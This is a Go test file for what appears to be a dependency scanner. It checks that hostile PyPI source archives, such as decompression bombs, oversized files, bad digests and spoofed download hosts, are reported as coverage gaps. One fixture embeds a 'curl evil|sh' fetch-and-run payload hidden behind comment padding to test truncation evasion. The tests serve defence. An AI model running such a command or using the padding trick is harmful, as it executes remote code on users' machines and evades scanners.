package pypi

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"

	"ihbv.io/depsnort/internal/datasource"
	"ihbv.io/depsnort/internal/ecosystem/instsurf"
	"ihbv.io/depsnort/internal/graph"
	"ihbv.io/depsnort/internal/purl"
)

// F-05. depsnort processes attacker-controlled sdists on purpose, so every one
// of these drives a real hostile-input shape and asserts it terminates within
// bounds AND surfaces a coverage gap (a returned error) rather than a partial
// result dressed up as clean.

// makeTar builds an uncompressed tar for extractFromTar (which reads the
// already-decompressed stream).
func makeTar(t *testing.T, files [][2]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, f := range files {
		name, content := f[0], f[1]
		if err := tw.WriteHeader(&tar.Header{
			Name: name, Mode: 0o644, Size: int64(len(content)), Typeflag: tar.TypeReg,
		}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func gzipBytes(t *testing.T, b []byte) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(b); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func TestExtractValidSdist(t *testing.T) {
	tarball := makeTar(t, [][2]string{
		{"pkg-1.0/setup.py", "import os"},
		{"pkg-1.0/pyproject.toml", "[build-system]"},
		{"pkg-1.0/sub/evil.pth", "import evil"},
	})
	files, err := extractFromTar(bytes.NewReader(tarball))
	if err != nil {
		t.Fatalf("valid sdist: %v", err)
	}
	if files.SetupPy != "import os" || files.PyprojectToml != "[build-system]" {
		t.Errorf("setup.py/pyproject.toml not extracted: %+v", files)
	}
	if files.PthFiles["evil.pth"] != "import evil" {
		t.Errorf("pth not extracted: %+v", files.PthFiles)
	}
}

func TestTruncatedTarIsGap(t *testing.T) {
	full := makeTar(t, [][2]string{{"pkg-1.0/setup.py", strings.Repeat("x", 4096)}})
	truncated := full[:len(full)-600] // cut into the last entry / trailer
	if _, err := extractFromTar(bytes.NewReader(truncated)); !errors.Is(err, ErrSdistCorrupt) {
		t.Fatalf("truncated tar: err=%v, want ErrSdistCorrupt", err)
	}
}

func TestDecompressedBombIsGap(t *testing.T) {
	defer func(v int64) { maxDecompressed = v }(maxDecompressed)
	maxDecompressed = 100
	tarball := makeTar(t, [][2]string{{"pkg-1.0/setup.py", strings.Repeat("A", 4096)}})
	if _, err := extractFromTar(bytes.NewReader(tarball)); !errors.Is(err, ErrSdistTooLarge) {
		t.Fatalf("decompression bomb: err=%v, want ErrSdistTooLarge", err)
	}
}

func TestEntryFloodIsGap(t *testing.T) {
	defer func(v int) { maxTarEntries = v }(maxTarEntries)
	maxTarEntries = 5
	var files [][2]string
	for i := 0; i < 20; i++ {
		files = append(files, [2]string{fmt.Sprintf("pkg-1.0/f%d", i), "x"})
	}
	if _, err := extractFromTar(bytes.NewReader(makeTar(t, files))); !errors.Is(err, ErrSdistTooManyEntries) {
		t.Fatalf("entry flood: err=%v, want ErrSdistTooManyEntries", err)
	}
}

// R-02. These previously asserted that exceeding a retention cap BOUNDED the
// result and returned success. That is fail-open: the .pth content past the cap
// was discarded silently, so a persistence payload split across many .pth files
// produced a clean-looking partial analysis. Exceeding a cap is now a coverage
// gap — the caller turns it into exit 3, not a pass.
func TestPthCountOverflowIsGap(t *testing.T) {
	defer func(v int) { maxPthFiles = v }(maxPthFiles)
	maxPthFiles = 2
	var files [][2]string
	for i := 0; i < 10; i++ {
		files = append(files, [2]string{fmt.Sprintf("pkg-1.0/p%d.pth", i), "import x"})
	}
	if _, err := extractFromTar(bytes.NewReader(makeTar(t, files))); !errors.Is(err, ErrSdistRetentionExceeded) {
		t.Fatalf(".pth count overflow: err=%v, want ErrSdistRetentionExceeded", err)
	}
}

func TestPthByteOverflowIsGap(t *testing.T) {
	defer func(v int64) { maxPthTotalBytes = v }(maxPthTotalBytes)
	maxPthTotalBytes = 20
	var files [][2]string
	for i := 0; i < 10; i++ {
		files = append(files, [2]string{fmt.Sprintf("pkg-1.0/p%d.pth", i), strings.Repeat("z", 15)})
	}
	if _, err := extractFromTar(bytes.NewReader(makeTar(t, files))); !errors.Is(err, ErrSdistRetentionExceeded) {
		t.Fatalf(".pth byte overflow: err=%v, want ErrSdistRetentionExceeded", err)
	}
}

// Retention within the caps must still succeed, or every ordinary sdist gates.
func TestPthWithinCapsSucceeds(t *testing.T) {
	got, err := extractFromTar(bytes.NewReader(makeTar(t, [][2]string{
		{"pkg-1.0/a.pth", "import a"},
		{"pkg-1.0/b.pth", "import b"},
	})))
	if err != nil {
		t.Fatalf(".pth within caps must succeed: %v", err)
	}
	if len(got.PthFiles) != 2 {
		t.Errorf("retained %d .pth files, want 2", len(got.PthFiles))
	}
}

// R-02, the detection-evasion case. io.LimitReader used to return exactly
// maxFileSize bytes with NO error, so an oversized setup.py was silently
// truncated: pad 2 MiB of comments, put the payload after the cut, and the
// analyzer scans a clean prefix and reports nothing.
func TestOversizedFileIsGapNotTruncation(t *testing.T) {
	defer func(v int64) { maxFileSize = v }(maxFileSize)
	maxFileSize = 512
	payload := strings.Repeat("#", 600) + "\nimport os; os.system('curl evil|sh')"
	_, err := extractFromTar(bytes.NewReader(makeTar(t, [][2]string{
		{"pkg-1.0/setup.py", payload},
	})))
	if !errors.Is(err, ErrSdistTooLarge) {
		t.Fatalf("oversized setup.py: err=%v, want ErrSdistTooLarge (never a silent truncation)", err)
	}
}

// R-02: a final oversized entry must not slip out through EOF unchecked, since
// the decompressed-total guard only fires on the NEXT loop iteration.
func TestFinalEntryDecompressionOverflowIsGap(t *testing.T) {
	defer func(v int64) { maxDecompressed = v }(maxDecompressed)
	maxDecompressed = 200
	// A single trailing entry that is not a target, so it is skipped rather than
	// read — the path that previously escaped the check.
	_, err := extractFromTar(bytes.NewReader(makeTar(t, [][2]string{
		{"pkg-1.0/filler.txt", strings.Repeat("A", 4096)},
	})))
	if !errors.Is(err, ErrSdistTooLarge) {
		t.Fatalf("final-entry overflow: err=%v, want ErrSdistTooLarge", err)
	}
}

// stubDoer routes requests to canned responses by URL.
type stubDoer struct{ routes map[string][]byte }

func (s stubDoer) Do(req *http.Request) (*http.Response, error) {
	body, ok := s.routes[req.URL.String()]
	if !ok {
		return &http.Response{StatusCode: 404, Body: io.NopCloser(strings.NewReader("")), Header: http.Header{}}, nil
	}
	return &http.Response{StatusCode: 200, Body: io.NopCloser(bytes.NewReader(body)), Header: http.Header{}}, nil
}

func fetcherWith(routes map[string][]byte) *SdistFetcher {
	return &SdistFetcher{HTTP: stubDoer{routes: routes}, Cache: datasource.NewCache(t2dir(), 0), Offline: false}
}

// t2dir returns a throwaway cache dir path; the cache tolerates a missing dir on
// write and these tests never read back from it.
func t2dir() string { return "" }

func jsonWithSdist(url, sha string, size int64) string {
	return fmt.Sprintf(`{"urls":[{"packagetype":"sdist","url":%q,"size":%d,"digests":{"sha256":%q}}]}`, url, size, sha)
}

func TestDigestMismatchIsGap(t *testing.T) {
	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import os"}}))
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	sdistURL := "https://files.pythonhosted.org/pkg-1.0.tar.gz"
	// Syntactically valid but wrong — this exercises the COMPARISON, where a
	// short string like "deadbeef" would now be rejected earlier as malformed.
	wrong := strings.Repeat("a", 64)
	f := fetcherWith(map[string][]byte{
		jsonURL:  []byte(jsonWithSdist(sdistURL, wrong, int64(len(tgz)))),
		sdistURL: tgz,
	})
	_, err := f.Fetch(context.Background(), "pkg", "1.0")
	if !errors.Is(err, ErrSdistDigestMismatch) {
		t.Fatalf("bad digest: err=%v, want ErrSdistDigestMismatch", err)
	}
}

// R-02: an absent or malformed digest previously DISABLED verification. Failing
// open on missing integrity metadata is backwards — that is precisely when the
// metadata should be distrusted.
func TestMissingOrMalformedDigestIsGap(t *testing.T) {
	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import os"}}))
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	sdistURL := "https://files.pythonhosted.org/pkg-1.0.tar.gz"
	for _, digest := range []string{"", "deadbeef", "not-hex-" + strings.Repeat("z", 56)} {
		f := fetcherWith(map[string][]byte{
			jsonURL:  []byte(jsonWithSdist(sdistURL, digest, int64(len(tgz)))),
			sdistURL: tgz,
		})
		if _, err := f.Fetch(context.Background(), "pkg", "1.0"); !errors.Is(err, ErrSdistNoDigest) {
			t.Errorf("digest %q: err=%v, want ErrSdistNoDigest", digest, err)
		}
	}
}

// R-02: the INITIAL download URL comes from index metadata and was trusted
// unchecked — only redirects were validated. An attacker able to influence that
// response could steer the fetch anywhere.
func TestDisallowedSdistOriginIsRefused(t *testing.T) {
	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import os"}}))
	sum := sha256.Sum256(tgz)
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	for _, evil := range []string{
		"https://evil.example/pkg-1.0.tar.gz",
		"https://files.pythonhosted.org.evil.example/pkg-1.0.tar.gz",
		"http://files.pythonhosted.org/pkg-1.0.tar.gz", // downgraded scheme
	} {
		f := fetcherWith(map[string][]byte{
			jsonURL: []byte(jsonWithSdist(evil, hex.EncodeToString(sum[:]), int64(len(tgz)))),
			evil:    tgz,
		})
		if _, err := f.Fetch(context.Background(), "pkg", "1.0"); !errors.Is(err, ErrSdistDisallowedHost) {
			t.Errorf("origin %q: err=%v, want ErrSdistDisallowedHost", evil, err)
		}
	}
}

func TestDigestMatchSucceeds(t *testing.T) {
	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import socket"}}))
	sum := sha256.Sum256(tgz)
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	sdistURL := "https://files.pythonhosted.org/pkg-1.0.tar.gz"
	f := fetcherWith(map[string][]byte{
		jsonURL:  []byte(jsonWithSdist(sdistURL, hex.EncodeToString(sum[:]), int64(len(tgz)))),
		sdistURL: tgz,
	})
	files, err := f.Fetch(context.Background(), "pkg", "1.0")
	if err != nil {
		t.Fatalf("matching digest should succeed: %v", err)
	}
	if files.SetupPy != "import socket" {
		t.Errorf("setup.py not extracted after digest check: %+v", files)
	}
}

// R-02 follow-up. An sdist whose DECLARED metadata size exceeds the cap used to
// be skipped by the selection loop, which then fell through to the wheel-only
// return. Fetch recorded WheelOnly=true — an ordinary, benign state — cached it,
// and reported no gap. An attacker only has to claim a large size to make their
// install surface invisible behind a clean result.
func TestDeclaredOversizeSdistIsGapNotWheelOnly(t *testing.T) {
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	body := fmt.Sprintf(
		`{"urls":[{"packagetype":"sdist","url":"https://files.pythonhosted.org/pkg-1.0.tar.gz",`+
			`"size":%d,"digests":{"sha256":"%s"}}]}`,
		maxSdistSize+1, strings.Repeat("a", 64))
	f := fetcherWith(map[string][]byte{jsonURL: []byte(body)})

	got, err := f.Fetch(context.Background(), "pkg", "1.0")
	if err == nil {
		t.Fatalf("declared-oversize sdist returned no error; got %+v (WheelOnly=%v)", got, got.WheelOnly)
	}
	if !errors.Is(err, ErrSdistTooLarge) {
		t.Errorf("err = %v, want ErrSdistTooLarge", err)
	}
	if got != nil && got.WheelOnly {
		t.Error("an oversized sdist must never be reported as wheel-only")
	}
}

// The control: a package that genuinely publishes ONLY wheels is a normal,
// complete result. If this gated, every wheel-only dependency would fail a scan.
func TestGenuinelyWheelOnlyStaysClean(t *testing.T) {
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	body := `{"urls":[{"packagetype":"bdist_wheel","url":"https://files.pythonhosted.org/pkg-1.0.whl","size":100}]}`
	f := fetcherWith(map[string][]byte{jsonURL: []byte(body)})

	got, err := f.Fetch(context.Background(), "pkg", "1.0")
	if err != nil {
		t.Fatalf("wheel-only package must not error: %v", err)
	}
	if !got.WheelOnly {
		t.Error("a package publishing only wheels must be recorded as wheel-only")
	}
}

// A mixed listing must still prefer the usable sdist rather than gating.
func TestOversizeSdistWithUsableAlternativeSucceeds(t *testing.T) {
	tgz := gzipBytes(t, makeTar(t, [][2]string{{"pkg-1.0/setup.py", "import os"}}))
	sum := sha256.Sum256(tgz)
	jsonURL := "https://pypi.org/pypi/pkg/1.0/json"
	okURL := "https://files.pythonhosted.org/pkg-1.0.tar.gz"
	body := fmt.Sprintf(
		`{"urls":[`+
			`{"packagetype":"sdist","url":"https://files.pythonhosted.org/huge.tar.gz","size":%d,"digests":{"sha256":"%s"}},`+
			`{"packagetype":"sdist","url":"%s","size":%d,"digests":{"sha256":"%s"}}]}`,
		maxSdistSize+1, strings.Repeat("b", 64), okURL, len(tgz), hex.EncodeToString(sum[:]))
	f := fetcherWith(map[string][]byte{jsonURL: []byte(body), okURL: tgz})

	got, err := f.Fetch(context.Background(), "pkg", "1.0")
	if err != nil {
		t.Fatalf("a usable sdist alongside an oversized one must succeed: %v", err)
	}
	if got.SetupPy != "import os" {
		t.Errorf("expected the usable sdist to be analyzed, got %+v", got)
	}
}

// Cached results carry the SEMANTICS version, so records written under the old
// fail-open rules cannot be silently reused after an upgrade (R-02 P2).
func TestSdistCacheKeyIsSemanticsVersioned(t *testing.T) {
	k := sdistCacheKey("flask", "2.0.1")
	if !strings.Contains(k, sdistSemantics) {
		t.Errorf("cache key %q does not carry the semantics version %q", k, sdistSemantics)
	}
	if k == "pypi-sdist|flask|2.0.1" {
		t.Error("cache key is unversioned; stale fail-open records would survive an upgrade")
	}
}

// The link the reviewer asked to see exercised: a hostile-sdist failure must
// travel out of Fetch, through the adapter, and arrive as an aggregated gap —
// which is what makes it reach coverage and exit 3.
func TestSdistFailureBecomesAnAdapterGap(t *testing.T) {
	jsonURL := "https://pypi.org/pypi/dep/1.0/json"
	body := fmt.Sprintf(
		`{"urls":[{"packagetype":"sdist","url":"https://files.pythonhosted.org/dep-1.0.tar.gz",`+
			`"size":%d,"digests":{"sha256":"%s"}}]}`,
		maxSdistSize+1, strings.Repeat("a", 64))

	a := &Adapter{Sdist: fetcherWith(map[string][]byte{jsonURL: []byte(body)})}

	g := graph.New()
	root := purl.NewPyPI("proj", "1.0.0").String()
	dep := purl.NewPyPI("dep", "1.0").String()
	g.AddNode(&graph.Node{ID: root, Kind: graph.KindPackage, Ecosystem: "pypi", Name: "proj", Version: "1.0.0"})
	g.AddNode(&graph.Node{ID: dep, Kind: graph.KindPackage, Ecosystem: "pypi", Name: "dep", Version: "1.0"})
	g.AddEdge(root, dep, graph.EdgeDependsOn)
	g.MarkRoot(root)

	err := a.ExtractInstallSurface(t.TempDir(), g)
	gaps := instsurf.GapsOf(err)
	if len(gaps) == 0 {
		t.Fatalf("an oversized sdist must surface as an adapter gap, got err=%v", err)
	}
	if gaps[0].Package != dep {
		t.Errorf("gap package = %q, want %q", gaps[0].Package, dep)
	}
}

func TestAllowedSdistHost(t *testing.T) {
	for _, h := range []string{"pypi.org", "files.pythonhosted.org", "pythonhosted.org", "PyPI.org:443"} {
		if !allowedSdistHost(h) {
			t.Errorf("%q should be allowed", h)
		}
	}
	for _, h := range []string{"evil.com", "pythonhosted.org.evil.com", "files.pythonhosted.org.attacker.net"} {
		if allowedSdistHost(h) {
			t.Errorf("%q should be refused", h)
		}
	}
}
